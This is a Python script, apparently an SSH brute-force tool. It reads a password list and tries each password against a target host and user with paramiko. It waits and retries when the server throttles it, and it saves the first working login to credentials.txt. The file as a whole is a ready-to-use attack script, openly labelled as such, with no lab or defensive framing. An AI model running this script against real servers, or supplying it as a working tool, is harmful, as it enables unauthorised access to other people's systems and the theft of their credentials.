import paramiko
import socket
import time
from colorama import init, Fore

# initialize colorama
init()

GREEN = Fore.GREEN
RED   = Fore.RED
RESET = Fore.RESET
BLUE  = Fore.BLUE
FAILED= Fore.LIGHTYELLOW_EX
ALERT = Fore.LIGHTBLUE_EX


def is_ssh_open(hostname, username, password, port=22):
    # initialize SSH client
    client = paramiko.SSHClient()
    # add to know hosts
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=hostname, username=username, password=password, port=port, timeout=3)
    except socket.timeout:
        # this is when host is unreachable
        print(f"{RED}[!] Host: {hostname} is unreachable, timed out.{RESET}")
        return False
    except paramiko.AuthenticationException:
        print(f"{FAILED}[!] Invalid credentials for {username}:{password}")
        return False
    except paramiko.SSHException:
        print(f"{BLUE}[*] Quota exceeded, retrying with delay...{RESET}")
        # sleep for a minute
        time.sleep(60)
        return is_ssh_open(hostname, username, password)
    else:
        # connection was established successfully
        print(f"{GREEN}[+] Logined {ALERT}{username}{RESET}:{ALERT}{password}{RESET}")
        print(f"{GREEN}[+] Found combo:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{RESET}")
        return True


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="SSH Bruteforce Python script.")
    parser.add_argument("host", help="Hostname or IP Address of SSH Server to bruteforce.")
    parser.add_argument("-P", "--passlist", help="File that contain password list in each line.")
    parser.add_argument("-u", "--user", help="Host username.")
    parser.add_argument("-p", "--port", help="Port Number")

    # parse passed arguments
    args = parser.parse_args()
    host = args.host
    passlist = args.passlist
    user = args.user
    port = args.port
    if not port:
        port = 22
    # read the file
    passlist = open(passlist).read().splitlines()
    # brute-force
    for password in passlist:
        if is_ssh_open(host, user, password, port):
            # if combo is valid, save it to a file
            open("credentials.txt", "w").write(f"{user}@{host}:{password}")
            break
